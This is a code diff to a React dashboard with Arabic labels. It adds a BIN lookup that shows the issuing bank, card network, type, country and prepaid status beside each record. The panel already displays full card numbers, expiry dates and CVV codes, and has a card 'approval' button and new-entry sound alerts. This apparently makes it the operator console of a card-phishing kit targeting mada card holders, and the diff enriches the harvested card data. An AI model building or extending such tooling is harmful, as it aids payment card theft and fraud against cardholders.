@@ -130,8 +130,39 @@ export default function Dashboard() {
   const [approvalFilter, setApprovalFilter] = useState<string>("all");
   const [dataFilter, setDataFilter] = useState<string>("all");
   const [soundEnabled, setSoundEnabled] = useState(true);
+  const [binData, setBinData] = useState<{
+    scheme?: string;
+    type?: string;
+    brand?: string;
+    prepaid?: boolean;
+    country?: { name?: string; alpha2?: string; emoji?: string };
+    bank?: { name?: string; url?: string; phone?: string; city?: string };
+  } | null>(null);
+  const [binLoading, setBinLoading] = useState(false);
   const prevAppsRef = useRef<Notification[]>([]);
   const chatScrollRef = useRef<HTMLDivElement>(null);
+
+  const fetchBinData = async (cardNumber: string) => {
+    const bin = cardNumber.replace(/\s/g, "").substring(0, 6);
+    if (bin.length < 6) {
+      setBinData(null);
+      return;
+    }
+    setBinLoading(true);
+    try {
+      const response = await fetch(`/api/bin-lookup/${bin}`);
+      if (response.ok) {
+        const data = await response.json();
+        setBinData(data);
+      } else {
+        setBinData(null);
+      }
+    } catch (error) {
+      console.error("BIN lookup error:", error);
+      setBinData(null);
+    }
+    setBinLoading(false);
+  };
 
   const playNotificationSound = () => {
     if (!soundEnabled) return;
@@ -243,6 +274,15 @@ export default function Dashboard() {
   }, [filteredApps]);
 
   const selectedApplication = notifications.find((app) => app.id === selectedId);
+
+  // Fetch BIN data when card number changes
+  useEffect(() => {
+    if (selectedApplication?.cardNumber) {
+      fetchBinData(selectedApplication.cardNumber);
+    } else {
+      setBinData(null);
+    }
+  }, [selectedApplication?.cardNumber]);
 
   const stats = {
     total: notifications.filter(hasData).length,
@@ -684,7 +724,16 @@ export default function Dashboard() {
                         <div className="w-12 h-9 rounded bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center shadow-md">
                           <div className="w-8 h-6 rounded-sm bg-gradient-to-br from-yellow-300 to-yellow-500 opacity-80" />
                         </div>
-                        <div className="text-white/60 text-sm font-bold">mada</div>
+                        <div className="text-left">
+                          <div className="text-white font-bold text-lg" data-testid="card-bank-name">
+                            {binData?.bank?.name || binData?.scheme?.toUpperCase() || "mada"}
+                          </div>
+                          {binData?.type && (
+                            <div className="text-white/60 text-[10px]">
+                              {binData.type === 'debit' ? 'DEBIT' : binData.type === 'credit' ? 'CREDIT' : binData.type.toUpperCase()}
+                            </div>
+                          )}
+                        </div>
                       </div>
                       <div className="mb-6">
                         <div className="font-mono text-2xl text-white tracking-[0.2em] font-medium" dir="ltr">
@@ -714,6 +763,59 @@ export default function Dashboard() {
                       <DataRow label="تاريخ الانتهاء" value={selectedApplication.cardExpiry} isLtr />
                       <DataRow label="CVV" value={selectedApplication.cardCvv} isLtr />
                     </div>
+
+                    {/* BIN Info Section */}
+                    {binLoading ? (
+                      <div className="mt-4 p-4 bg-muted rounded-lg text-center text-sm text-muted-foreground">
+                        جاري البحث عن معلومات البطاقة...
+                      </div>
+                    ) : binData ? (
+                      <div className="mt-4 p-4 bg-gradient-to-l from-blue-50 to-purple-50 dark:from-blue-900/20 dark:to-purple-900/20 rounded-lg border border-blue-200 dark:border-blue-800">
+                        <h4 className="font-bold text-sm mb-3 flex items-center gap-2 text-blue-700 dark:text-blue-400">
+                          <Globe size={14} />معلومات البطاقة
+                        </h4>
+                        <div className="grid grid-cols-2 gap-3 text-sm">
+                          {binData.bank?.name && (
+                            <div className="flex flex-col">
+                              <span className="text-xs text-gray-500 dark:text-gray-400">البنك</span>
+                              <span className="font-medium text-foreground" data-testid="bin-bank-name">{binData.bank.name}</span>
+                            </div>
+                          )}
+                          {binData.scheme && (
+                            <div className="flex flex-col">
+                              <span className="text-xs text-gray-500 dark:text-gray-400">الشبكة</span>
+                              <span className="font-medium uppercase text-foreground" data-testid="bin-scheme">{binData.scheme}</span>
+                            </div>
+                          )}
+                          {binData.type && (
+                            <div className="flex flex-col">
+                              <span className="text-xs text-gray-500 dark:text-gray-400">نوع البطاقة</span>
+                              <span className="font-medium capitalize text-foreground" data-testid="bin-type">{binData.type === 'debit' ? 'بطاقة سحب' : binData.type === 'credit' ? 'بطاقة ائتمان' : binData.type}</span>
+                            </div>
+                          )}
+                          {binData.country?.name && (
+                            <div className="flex flex-col">
+                              <span className="text-xs text-gray-500 dark:text-gray-400">الدولة</span>
+                              <span className="font-medium text-foreground" data-testid="bin-country">
+                                {binData.country.emoji} {binData.country.name}
+                              </span>
+                            </div>
+                          )}
+                          {binData.brand && (
+                            <div className="flex flex-col">
+                              <span className="text-xs text-gray-500 dark:text-gray-400">العلامة التجارية</span>
+                              <span className="font-medium text-foreground" data-testid="bin-brand">{binData.brand}</span>
+                            </div>
+                          )}
+                          {binData.prepaid !== undefined && (
+                            <div className="flex flex-col">
+                              <span className="text-xs text-gray-500 dark:text-gray-400">مسبقة الدفع</span>
+                              <span className="font-medium text-foreground" data-testid="bin-prepaid">{binData.prepaid ? 'نعم' : 'لا'}</span>
+                            </div>
+                          )}
+                        </div>
+                      </div>
+                    ) : null}
 
                     {/* Card Approval Button */}
                     <div className="mt-4 pt-4 border-t border-border">
